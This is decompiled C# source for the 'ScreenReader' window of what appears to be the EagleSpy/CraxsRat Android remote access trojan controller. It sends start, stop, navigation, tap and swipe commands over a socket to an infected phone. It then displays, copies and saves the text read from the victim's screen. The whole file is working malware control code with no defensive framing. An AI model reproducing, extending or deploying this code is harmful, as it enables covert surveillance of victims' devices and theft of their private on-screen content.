using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;
using DrakeUI.Framework;
using Eagle_Spy.sockets;
using Guna.UI2.WinForms;
using Microsoft.VisualBasic.CompilerServices;
using Sipaa.Framework;

namespace Eagle_Spy
{
	// Token: 0x0200009F RID: 159
	[DesignerGenerated]
	public partial class ScreenReader : Form
	{
		// Token: 0x0600084A RID: 2122 RVA: 0x000CDE28 File Offset: 0x000CC028
		public ScreenReader()
		{
			base.Load += this.CraxsRatkfvuiorkenfudpajrsnCraxsRatsijygesq;
			base.FormClosing += this.ScreenReader_FormClosing;
			this.Title = "null";
			this.firstclick = true;
			this.tiks = 0;
			this.Swaping = false;
			this.isdown = false;
			this.isclick = false;
			this.InitializeComponent();
			this.StartReader();
		}

		// Token: 0x0600084D RID: 2125 RVA: 0x00002423 File Offset: 0x00000623
		private void CraxsRatkfvuiorkenfudpajrsnCraxsRatsaxrftyu(object sender, EventArgs e)
		{
		}

		// Token: 0x0600084E RID: 2126 RVA: 0x000CF250 File Offset: 0x000CD450
		private void DrakeUIButtonIcon1_Click(object sender, EventArgs e)
		{
			if (this.Classclient != null)
			{
				TcpClient myClient = this.Classclient.myClient;
				string[] array = this.Classclient.Keys.Split(new char[] { ':' });
				object[] array2 = new object[]
				{
					myClient,
					string.Concat(new string[]
					{
						SecurityKey.KeysClient2,
						Data.SPL_SOCKET,
						"SCRD<*>f",
						Data.SPL_SOCKET,
						array[0],
						Data.SPL_SOCKET,
						array[1],
						Data.SPL_SOCKET,
						SecurityKey.Lockscreen,
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Data.SPL_ARRAY,
						Data.SPL_SOCKET,
						this.Classclient.ClientRemoteAddress
					}),
					Codes.Encoding().GetBytes("null"),
					this.Classclient
				};
				this.Classclient.SendMessage(array2);
				this.enablebtn.Enabled = true;
				this.disablebtn.Enabled = false;
			}
		}

		// Token: 0x0600084F RID: 2127 RVA: 0x000CF380 File Offset: 0x000CD580
		public void CraxsRatkfvuiorkenfudpajrsnCraxsRatsxczxsdkh(object[] objs)
		{
			checked
			{
				try
				{
					if (this.viewpanel.InvokeRequired)
					{
						ScreenReader.addLogback addLogback = new ScreenReader.addLogback(this.CraxsRatkfvuiorkenfudpajrsnCraxsRatsxczxsdkh);
						this.viewpanel.Invoke(addLogback, new object[] { objs });
					}
					else
					{
						string text = Conversions.ToString(objs[0]);
						if (Operators.CompareString(text, "CLR", false) == 0)
						{
							this.viewpanel.Controls.Clear();
						}
						else
						{
							string[] array = text.Split(new char[] { '^' });
							int num = array.Length - 1;
							ScreenReader._Closure_0024__52_002D0 closure_0024__52_002D = null;
							for (int i = 0; i <= num; i++)
							{
								closure_0024__52_002D = new ScreenReader._Closure_0024__52_002D0(closure_0024__52_002D);
								closure_0024__52_002D._0024VB_0024Me = this;
								string[] array2 = array[i].Split(new char[] { ':' });
								closure_0024__52_002D._0024VB_0024Local_Type = new TextBox();
								string text2 = array2[0];
								if (!string.IsNullOrWhiteSpace(text2) && !text2.Contains("null"))
								{
									this.textBox1.AppendText("> " + text2 + "\r\n");
								}
								closure_0024__52_002D._0024VB_0024Local_sizearry = array2[1].Split(new char[] { '~' });
								string[] array3 = array2[2].Split(new char[] { '~' });
								string[] array4 = null;
								try
								{
									array4 = array2[3].Split(new char[] { '~' });
								}
								catch (Exception)
								{
									array4 = null;
								}
								int num2 = Conversions.ToInteger(array3[0]);
								int num3 = Conversions.ToInteger(array3[1]);
								if (this.ScreenSize == default(Size))
								{
									this.ScreenSize = new Size(Conversions.ToInteger(array3[0]), Conversions.ToInteger(array3[1]));
								}
								closure_0024__52_002D._0024VB_0024Local_Type.Location = new Point((int)Math.Round(unchecked(Conversions.ToDouble(closure_0024__52_002D._0024VB_0024Local_sizearry[0]) * ((double)this.viewpanel.Width / (double)num2))), (int)Math.Round(unchecked(Conversions.ToDouble(closure_0024__52_002D._0024VB_0024Local_sizearry[1]) * ((double)this.viewpanel.Height / (double)num3))));
								foreach (object obj in this.viewpanel.Controls)
								{
									Control control = (Control)obj;
									try
									{
										if (closure_0024__52_002D._0024VB_0024Local_Type.Bounds.IntersectsWith(control.Bounds) && closure_0024__52_002D._0024VB_0024Local_Type.Text.Equals(control.Text, StringComparison.CurrentCultureIgnoreCase))
										{
											this.viewpanel.Controls.Remove(control);
										}
									}
									catch (Exception)
									{
									}
								}
								closure_0024__52_002D._0024VB_0024Local_Type.Text = text2;
								if (array4 == null)
								{
									Size size = TextRenderer.MeasureText(closure_0024__52_002D._0024VB_0024Local_Type.Text, closure_0024__52_002D._0024VB_0024Local_Type.Font);
									closure_0024__52_002D._0024VB_0024Local_Type.Size = new Size(size.Width, 20);
								}
								else
								{
									Size size2 = TextRenderer.MeasureText(closure_0024__52_002D._0024VB_0024Local_Type.Text, closure_0024__52_002D._0024VB_0024Local_Type.Font);
									closure_0024__52_002D._0024VB_0024Local_Type.Size = new Size(size2.Width, Conversions.ToInteger(array4[1]));
								}
								closure_0024__52_002D._0024VB_0024Local_Type.BorderStyle = BorderStyle.None;
								closure_0024__52_002D._0024VB_0024Local_Type.BackColor = Color.Black;
								closure_0024__52_002D._0024VB_0024Local_Type.ForeColor = Color.Red;
								closure_0024__52_002D._0024VB_0024Local_Type.ReadOnly = true;
								closure_0024__52_002D._0024VB_0024Local_Type.BorderStyle = BorderStyle.FixedSingle;
								closure_0024__52_002D._0024VB_0024Local_Type.DoubleClick += closure_0024__52_002D._Lambda_0024__0;
								closure_0024__52_002D._0024VB_0024Local_Type.MouseClick += closure_0024__52_002D._Lambda_0024__1;
								this.viewpanel.Controls.Add(closure_0024__52_002D._0024VB_0024Local_Type);
							}
						}
					}
				}
				catch (Exception)
				{
				}
			}
		}

		// Token: 0x06000850 RID: 2128 RVA: 0x00004B8E File Offset: 0x00002D8E
		private void CraxsRatkfvuiorkenfudpajrsnCraxsRatsijygesq(object sender, EventArgs e)
		{
			this.Timer1.Enabled = true;
			this.Timer1.Start();
		}

		// Token: 0x06000851 RID: 2129 RVA: 0x000CF784 File Offset: 0x000CD984
		private void DrakeUIButtonIcon2_Click(object sender, EventArgs e)
		{
			try
			{
				this.viewpanel.Controls.Clear();
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x06000852 RID: 2130 RVA: 0x000CF7B8 File Offset: 0x000CD9B8
		private void Timer1_Tick(object sender, EventArgs e)
		{
			if (this.viewpanel.Controls.Count <= 0)
			{
				return;
			}
			checked
			{
				int num = this.viewpanel.Controls.Count - 1;
				for (int i = 0; i <= num; i++)
				{
					try
					{
						if (this.viewpanel.Controls[i].Tag != null && Operators.ConditionalCompareObjectEqual(this.viewpanel.Controls[i].Tag, "E", false))
						{
							this.viewpanel.Controls.Remove(this.viewpanel.Controls[i]);
						}
					}
					catch (Exception)
					{
					}
				}
			}
		}

		// Token: 0x06000853 RID: 2131 RVA: 0x000CF86C File Offset: 0x000CDA6C
		private void ScreenReader_FormClosing(object sender, FormClosingEventArgs e)
		{
			if (this.Classclient != null)
			{
				TcpClient myClient = this.Classclient.myClient;
				string[] array = this.Classclient.Keys.Split(new char[] { ':' });
				object[] array2 = new object[]
				{
					myClient,
					string.Concat(new string[]
					{
						SecurityKey.KeysClient2,
						Data.SPL_SOCKET,
						"SCRD<*>f",
						Data.SPL_SOCKET,
						array[0],
						Data.SPL_SOCKET,
						array[1],
						Data.SPL_SOCKET,
						SecurityKey.Lockscreen,
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Data.SPL_ARRAY,
						Data.SPL_SOCKET,
						this.Classclient.ClientRemoteAddress
					}),
					Codes.Encoding().GetBytes("null"),
					this.Classclient
				};
				this.Classclient.SendMessage(array2);
			}
			this.Timer1.Stop();
			this.Timer1.Enabled = false;
		}

		// Token: 0x06000854 RID: 2132 RVA: 0x000CF998 File Offset: 0x000CDB98
		private void DrakeUIButtonIcon4_Click(object sender, EventArgs e)
		{
			if (this.Classclient != null)
			{
				try
				{
					string[] array = this.Classclient.Keys.Split(new char[] { ':' });
					object[] array2 = new object[]
					{
						this.Classclient.myClient,
						string.Concat(new string[]
						{
							SecurityKey.KeysClient2,
							Data.SPL_SOCKET,
							"sp<*>Bc",
							Data.SPL_SOCKET,
							array[0],
							Data.SPL_SOCKET,
							array[1],
							Data.SPL_SOCKET,
							SecurityKey.Lockscreen,
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Data.SPL_ARRAY,
							Data.SPL_SOCKET,
							this.Classclient.ClientRemoteAddress
						}),
						Codes.Encoding().GetBytes("null"),
						this.Classclient
					};
					this.Classclient.SendMessage(array2);
				}
				catch (Exception)
				{
				}
			}
		}

		// Token: 0x06000855 RID: 2133 RVA: 0x000CFAC0 File Offset: 0x000CDCC0
		private void DrakeUIButtonIcon1_Click_1(object sender, EventArgs e)
		{
			if (this.Classclient != null)
			{
				try
				{
					string[] array = this.Classclient.Keys.Split(new char[] { ':' });
					object[] array2 = new object[]
					{
						this.Classclient.myClient,
						string.Concat(new string[]
						{
							SecurityKey.KeysClient2,
							Data.SPL_SOCKET,
							"sp<*>Ho",
							Data.SPL_SOCKET,
							array[0],
							Data.SPL_SOCKET,
							array[1],
							Data.SPL_SOCKET,
							SecurityKey.Lockscreen,
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Data.SPL_ARRAY,
							Data.SPL_SOCKET,
							this.Classclient.ClientRemoteAddress
						}),
						Codes.Encoding().GetBytes("null"),
						this.Classclient
					};
					this.Classclient.SendMessage(array2);
				}
				catch (Exception)
				{
				}
			}
		}

		// Token: 0x06000856 RID: 2134 RVA: 0x000CFBE8 File Offset: 0x000CDDE8
		private void DrakeUIButtonIcon3_Click(object sender, EventArgs e)
		{
			if (this.Classclient != null)
			{
				try
				{
					string[] array = this.Classclient.Keys.Split(new char[] { ':' });
					object[] array2 = new object[]
					{
						this.Classclient.myClient,
						string.Concat(new string[]
						{
							SecurityKey.KeysClient2,
							Data.SPL_SOCKET,
							"sp<*>RC",
							Data.SPL_SOCKET,
							array[0],
							Data.SPL_SOCKET,
							array[1],
							Data.SPL_SOCKET,
							SecurityKey.Lockscreen,
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Data.SPL_ARRAY,
							Data.SPL_SOCKET,
							this.Classclient.ClientRemoteAddress
						}),
						Codes.Encoding().GetBytes("null"),
						this.Classclient
					};
					this.Classclient.SendMessage(array2);
				}
				catch (Exception)
				{
				}
			}
		}

		// Token: 0x06000857 RID: 2135 RVA: 0x000CFD10 File Offset: 0x000CDF10
		private void Viewpanel_MouseDown(object sender, MouseEventArgs e)
		{
			if (e.Button == MouseButtons.Left)
			{
				this.Trakpoint = new List<Point>();
				this.Trakpoint.Add(new Point(e.X, e.Y));
				this.isclick = false;
				this.isdown = true;
				return;
			}
			this.isclick = true;
		}

		// Token: 0x06000858 RID: 2136 RVA: 0x00004BA7 File Offset: 0x00002DA7
		private void Viewpanel_MouseMove(object sender, MouseEventArgs e)
		{
			if (this.isdown)
			{
				this.Swaping = true;
				this.isclick = false;
				this.Trakpoint.Add(new Point(e.X, e.Y));
			}
		}

		// Token: 0x06000859 RID: 2137 RVA: 0x000CFD68 File Offset: 0x000CDF68
		private void Viewpanel_MouseUp(object sender, MouseEventArgs e)
		{
			this.isdown = false;
			int width = this.viewpanel.Width;
			int height = this.viewpanel.Height;
			checked
			{
				if (this.isclick)
				{
					string text = "clk:";
					this.tiks = 0;
					Point point = this.viewpanel.PointToClient(Control.MousePosition);
					Point point2 = new Point((int)Math.Round(unchecked((double)point.X * ((double)width / (double)width))), (int)Math.Round(unchecked((double)point.Y * ((double)height / (double)height))));
					text = text + point2.X.ToString() + ":" + point2.Y.ToString();
					string[] array = this.Classclient.Keys.Split(new char[] { ':' });
					object[] array2 = new object[]
					{
						this.Classclient.myClient,
						string.Concat(new string[]
						{
							SecurityKey.KeysClient2,
							Data.SPL_SOCKET,
							"sp<*>",
							text,
							Data.SPL_SOCKET,
							array[0],
							Data.SPL_SOCKET,
							array[1],
							Data.SPL_SOCKET,
							SecurityKey.Lockscreen,
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Data.SPL_ARRAY,
							Data.SPL_SOCKET,
							this.Classclient.ClientRemoteAddress
						}),
						Codes.Encoding().GetBytes("null"),
						this.Classclient
					};
					this.Classclient.SendMessage(array2);
					return;
				}
				if (!this.Swaping)
				{
					return;
				}
				this.Swaping = false;
				this.Trakpoint.Add(new Point(e.X, e.Y));
				StringBuilder stringBuilder = new StringBuilder();
				foreach (Point point3 in this.Trakpoint)
				{
					stringBuilder.Append(new Point((int)Math.Round(unchecked((double)point3.X * ((double)this.ScreenSize.Width / (double)width))), (int)Math.Round(unchecked((double)point3.Y * ((double)this.ScreenSize.Height / (double)height)))).ToString() + ":");
				}
				string[] array3 = this.Classclient.Keys.Split(new char[] { ':' });
				object[] array4 = new object[]
				{
					this.Classclient.myClient,
					string.Concat(new string[]
					{
						SecurityKey.KeysClient2,
						Data.SPL_SOCKET,
						"sp<*>",
						stringBuilder.ToString(),
						Data.SPL_SOCKET,
						array3[0],
						Data.SPL_SOCKET,
						array3[1],
						Data.SPL_SOCKET,
						SecurityKey.Lockscreen,
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Data.SPL_ARRAY,
						Data.SPL_SOCKET,
						this.Classclient.ClientRemoteAddress
					}),
					Codes.Encoding().GetBytes("null"),
					this.Classclient
				};
				this.Classclient.SendMessage(array4);
			}
		}

		// Token: 0x0600085A RID: 2138 RVA: 0x000CF7B8 File Offset: 0x000CD9B8
		private void drakeUIButton1_Click(object sender, EventArgs e)
		{
			if (this.viewpanel.Controls.Count <= 0)
			{
				return;
			}
			checked
			{
				int num = this.viewpanel.Controls.Count - 1;
				for (int i = 0; i <= num; i++)
				{
					try
					{
						if (this.viewpanel.Controls[i].Tag != null && Operators.ConditionalCompareObjectEqual(this.viewpanel.Controls[i].Tag, "E", false))
						{
							this.viewpanel.Controls.Remove(this.viewpanel.Controls[i]);
						}
					}
					catch (Exception)
					{
					}
				}
			}
		}

		// Token: 0x0600085B RID: 2139 RVA: 0x00002423 File Offset: 0x00000623
		private void drakeUIButtonIcon4_Click_1(object sender, EventArgs e)
		{
		}

		// Token: 0x0600085C RID: 2140 RVA: 0x00002423 File Offset: 0x00000623
		private void drakeUIButtonIcon3_Click_1(object sender, EventArgs e)
		{
		}

		// Token: 0x0600085D RID: 2141 RVA: 0x000D0100 File Offset: 0x000CE300
		private void StartReader()
		{
			if (this.Classclient != null)
			{
				TcpClient myClient = this.Classclient.myClient;
				string[] array = this.Classclient.Keys.Split(new char[] { ':' });
				object[] array2 = new object[]
				{
					myClient,
					string.Concat(new string[]
					{
						SecurityKey.KeysClient2,
						Data.SPL_SOCKET,
						"SCRD<*>o",
						Data.SPL_SOCKET,
						array[0],
						Data.SPL_SOCKET,
						array[1],
						Data.SPL_SOCKET,
						SecurityKey.Lockscreen,
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Data.SPL_ARRAY,
						Data.SPL_SOCKET,
						this.Classclient.ClientRemoteAddress
					}),
					Codes.Encoding().GetBytes("null"),
					this.Classclient
				};
				this.Classclient.SendMessage(array2);
				this.Timer1.Enabled = true;
				this.enablebtn.Enabled = false;
				this.disablebtn.Enabled = true;
			}
		}

		// Token: 0x0600085E RID: 2142 RVA: 0x000D0100 File Offset: 0x000CE300
		private void sButton1_Click(object sender, EventArgs e)
		{
			if (this.Classclient != null)
			{
				TcpClient myClient = this.Classclient.myClient;
				string[] array = this.Classclient.Keys.Split(new char[] { ':' });
				object[] array2 = new object[]
				{
					myClient,
					string.Concat(new string[]
					{
						SecurityKey.KeysClient2,
						Data.SPL_SOCKET,
						"SCRD<*>o",
						Data.SPL_SOCKET,
						array[0],
						Data.SPL_SOCKET,
						array[1],
						Data.SPL_SOCKET,
						SecurityKey.Lockscreen,
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Data.SPL_ARRAY,
						Data.SPL_SOCKET,
						this.Classclient.ClientRemoteAddress
					}),
					Codes.Encoding().GetBytes("null"),
					this.Classclient
				};
				this.Classclient.SendMessage(array2);
				this.Timer1.Enabled = true;
				this.enablebtn.Enabled = false;
				this.disablebtn.Enabled = true;
			}
		}

		// Token: 0x0600085F RID: 2143 RVA: 0x000CF250 File Offset: 0x000CD450
		private void sButton2_Click(object sender, EventArgs e)
		{
			if (this.Classclient != null)
			{
				TcpClient myClient = this.Classclient.myClient;
				string[] array = this.Classclient.Keys.Split(new char[] { ':' });
				object[] array2 = new object[]
				{
					myClient,
					string.Concat(new string[]
					{
						SecurityKey.KeysClient2,
						Data.SPL_SOCKET,
						"SCRD<*>f",
						Data.SPL_SOCKET,
						array[0],
						Data.SPL_SOCKET,
						array[1],
						Data.SPL_SOCKET,
						SecurityKey.Lockscreen,
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Data.SPL_ARRAY,
						Data.SPL_SOCKET,
						this.Classclient.ClientRemoteAddress
					}),
					Codes.Encoding().GetBytes("null"),
					this.Classclient
				};
				this.Classclient.SendMessage(array2);
				this.enablebtn.Enabled = true;
				this.disablebtn.Enabled = false;
			}
		}

		// Token: 0x06000860 RID: 2144 RVA: 0x000D023C File Offset: 0x000CE43C
		private void sButton3_Click(object sender, EventArgs e)
		{
			SaveFileDialog saveFileDialog = new SaveFileDialog();
			saveFileDialog.Filter = "Text Files (*.txt)|*.txt|All Files (*.*)|*.*";
			saveFileDialog.Title = "Save As Text File";
			if (saveFileDialog.ShowDialog() == DialogResult.OK)
			{
				string fileName = saveFileDialog.FileName;
				using (StreamWriter streamWriter = new StreamWriter(fileName))
				{
					streamWriter.Write(this.textBox1.Text);
				}
			}
		}

		// Token: 0x06000861 RID: 2145 RVA: 0x000D02AC File Offset: 0x000CE4AC
		private void UpdateEnglish()
		{
			this.drakeUIButtonIcon5.Text = "Screen Text Reader";
			this.sButton1.Text = "START";
			this.sButton2.Text = "STOP";
			this.sButton3.Text = "SAVE";
		}

		// Token: 0x06000862 RID: 2146 RVA: 0x000D02FC File Offset: 0x000CE4FC
		private void UpdateChinese()
		{
			this.drakeUIButtonIcon5.Text = "屏幕文本阅读器";
			this.sButton1.Text = "开始";
			this.sButton2.Text = "停止";
			this.sButton3.Text = "保存";
		}

		// Token: 0x06000863 RID: 2147 RVA: 0x000D034C File Offset: 0x000CE54C
		private void UpdateRussian()
		{
			this.drakeUIButtonIcon5.Text = "Чтение текста на экране";
			this.sButton1.Text = "СТАРТ";
			this.sButton2.Text = "СТОП";
			this.sButton3.Text = "СОХРАНИТЬ";
		}

		// Token: 0x06000864 RID: 2148 RVA: 0x000D039C File Offset: 0x000CE59C
		private void UpdateLanguage()
		{
			string text = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "res", "Config", "Language.inf");
			if (File.Exists(text))
			{
				string text2 = File.ReadAllText(text);
				if (text2.Contains("English"))
				{
					this.UpdateEnglish();
					return;
				}
				if (text2.Contains("Russian"))
				{
					this.UpdateRussian();
					return;
				}
				if (text2.Contains("Chinese"))
				{
					this.UpdateChinese();
					return;
				}
				this.UpdateEnglish();
			}
		}

		// Token: 0x06000865 RID: 2149 RVA: 0x00004BDB File Offset: 0x00002DDB
		private void ScreenReader_Load(object sender, EventArgs e)
		{
			this.UpdateLanguage();
		}

		// Token: 0x06000866 RID: 2150
		[DllImport("user32.dll")]
		public static extern int SendMessage(IntPtr hWnd, int Msg, int wParam, int lParam);

		// Token: 0x06000867 RID: 2151
		[DllImport("user32.dll")]
		public static extern bool ReleaseCapture();

		// Token: 0x06000868 RID: 2152 RVA: 0x00004BE3 File Offset: 0x00002DE3
		private void drakeUIButtonIcon5_MouseDown(object sender, MouseEventArgs e)
		{
			if (e.Button == MouseButtons.Left)
			{
				ScreenReader.ReleaseCapture();
				ScreenReader.SendMessage(base.Handle, 161, 2, 0);
			}
		}

		// Token: 0x040009AD RID: 2477
		public Client Classclient;

		// Token: 0x040009AE RID: 2478
		public string Title;

		// Token: 0x040009AF RID: 2479
		public object firstclick;

		// Token: 0x040009B0 RID: 2480
		public ScreenLoger LogScreen;

		// Token: 0x040009B1 RID: 2481
		private int tiks;

		// Token: 0x040009B2 RID: 2482
		private bool Swaping;

		// Token: 0x040009B3 RID: 2483
		private bool isdown;

		// Token: 0x040009B4 RID: 2484
		private bool isclick;

		// Token: 0x040009B5 RID: 2485
		public Size ScreenSize;

		// Token: 0x040009B6 RID: 2486
		private List<Point> Trakpoint;

		// Token: 0x020000A0 RID: 160
		// (Invoke) Token: 0x0600086A RID: 2154
		public delegate void addLogback(object[] objs);

		// Token: 0x020000A1 RID: 161
		[CompilerGenerated]
		internal sealed class _Closure_0024__52_002D0
		{
			// Token: 0x0600086D RID: 2157 RVA: 0x00004C0B File Offset: 0x00002E0B
			public _Closure_0024__52_002D0(ScreenReader._Closure_0024__52_002D0 arg0)
			{
				if (arg0 != null)
				{
					this._0024VB_0024Local_Type = arg0._0024VB_0024Local_Type;
					this._0024VB_0024Local_sizearry = arg0._0024VB_0024Local_sizearry;
				}
			}

			// Token: 0x0600086E RID: 2158 RVA: 0x000D041C File Offset: 0x000CE61C
			internal void _Lambda_0024__0(object sender2, EventArgs eventargs2)
			{
				try
				{
					Clipboard.SetText(this._0024VB_0024Local_Type.Text);
					EagleAlert.ShowSucess("Text Copied.");
					this._0024VB_0024Local_Type.Tag = "E";
				}
				catch (Exception)
				{
				}
			}

			// Token: 0x0600086F RID: 2159 RVA: 0x000D0468 File Offset: 0x000CE668
			internal void _Lambda_0024__1(object sender2, MouseEventArgs eventargs2)
			{
				try
				{
					string text = "clk:";
					this._0024VB_0024Me.tiks = 0;
					this._0024VB_0024Me.viewpanel.PointToClient(Control.MousePosition);
					text = text + Convert.ToInt32(Conversions.ToDouble(this._0024VB_0024Local_sizearry[0])).ToString() + ":" + Convert.ToInt32(Conversions.ToDouble(this._0024VB_0024Local_sizearry[1])).ToString();
					string[] array = this._0024VB_0024Me.Classclient.Keys.Split(new char[] { ':' });
					object[] array2 = new object[]
					{
						this._0024VB_0024Me.Classclient.myClient,
						string.Concat(new string[]
						{
							SecurityKey.KeysClient2,
							Data.SPL_SOCKET,
							"sp<*>",
							text,
							Data.SPL_SOCKET,
							array[0],
							Data.SPL_SOCKET,
							array[1],
							Data.SPL_SOCKET,
							SecurityKey.Lockscreen,
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Data.SPL_ARRAY,
							Data.SPL_SOCKET,
							this._0024VB_0024Me.Classclient.ClientRemoteAddress
						}),
						Codes.Encoding().GetBytes("null"),
						this._0024VB_0024Me.Classclient
					};
					this._0024VB_0024Me.Classclient.SendMessage(array2);
				}
				catch (Exception)
				{
				}
			}

			// Token: 0x040009C8 RID: 2504
			public TextBox _0024VB_0024Local_Type;

			// Token: 0x040009C9 RID: 2505
			public string[] _0024VB_0024Local_sizearry;

			// Token: 0x040009CA RID: 2506
			public ScreenReader _0024VB_0024Me;
		}
	}
}
